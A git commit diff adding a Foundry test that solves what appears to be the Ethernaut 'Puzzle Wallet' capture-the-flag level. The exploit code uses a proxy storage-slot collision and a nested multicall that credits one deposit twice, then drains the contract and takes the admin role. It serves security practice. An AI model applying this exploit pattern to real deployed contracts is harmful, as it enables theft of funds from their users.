353c04d8ec1d8d4823bebe076ea9a1d156e11ca9
bentobox19 <bentobox19@protonmail.com>
2022-08-08 03:31:17 -0400

    add 24-puzzlewallet

--- test/24-puzzle-wallet/PuzzleWallet.t.sol
+++ test/24-puzzle-wallet/PuzzleWallet.t.sol
@@ -5,7 +5,10 @@ import "forge-std/Test.sol";
 import "../utils.sol";
 
 interface ITarget {
-  function init(uint256) external;
+  function proposeNewAdmin(address) external;
+  function addToWhitelist(address) external;
+  function multicall(bytes[] calldata) external payable;
+  function execute(address, uint256, bytes memory) external;
   function setMaxBalance(uint256) external;
 }
 
@@ -17,23 +20,48 @@ contract PuzzleWalletTest is Test {
   }
 
   function testExploit() public {
-    // challengeAddress is the proxy
-    // let's read its storage
-
-    console.logBytes32(vm.load(challengeAddress, bytes32(uint256(0))));
-    console.logBytes32(vm.load(challengeAddress, bytes32(uint256(1))));
-    console.logBytes32(vm.load(challengeAddress, bytes32(uint256(2))));
-    console.logBytes32(vm.load(challengeAddress, bytes32(uint256(2))));
-
     ITarget target = ITarget(challengeAddress);
-    target.setMaxBalance(20);
+    // anybody can call this one
+    // will switch slot0 which is pendingAdmin and owner
+    target.proposeNewAdmin(address(this));
 
+    // now we can be added to the whitelist (we are the owner)
+    target.addToWhitelist(address(this));
 
+    // to win the level
+    // - setMaxBalance()
+    //   will switch admin/maxBalance to our address
+    //   but we need to comply with address(this).balance == 0
+    // - execute()
+    //   now, this one requires balances[msg.sender] >= value
+    // - deposit()
+    //   takes the msg.value we send and puts it into the contract
+    //   incrementing our value at balance[]
+    // - multicall gives you a way to run deposit() twice
+    //   transfering to the contract 0.001 ether BUT
+    //   crediting your balance[] as 0.002
+    //   its flaw is that its control, depositCalled
+    //     won't detect if you are calling the function
+    //     from multicall() itself
+    bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
 
-    // nota
-    // leer esto para cachar del storage en los proxies
-    // https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies
+    bytes[] memory params = new bytes[](1);
+    params[0] = depositCalldata;
+    bytes memory multicallCallData = abi.encodeWithSignature("multicall(bytes[])", params);
 
-    // utils.submitLevelInstance(challengeAddress);
+    bytes[] memory multicallInput = new bytes[](2);
+    multicallInput[0] = depositCalldata;
+    multicallInput[1] = multicallCallData;
+
+    target.multicall{value: 0.001 ether}(multicallInput);
+
+    // as our balance[] is 0.002, we can call execute(), draining the contract
+    bytes memory b;
+    target.execute(0x0000000000000000000000000000000000000000, 0.002 ether, b);
+
+    // and now we can modify slot1 which is admin/maxBalance
+    target.setMaxBalance(uint160(address(this)));
+
+    utils.submitLevelInstance(challengeAddress);
   }
 }
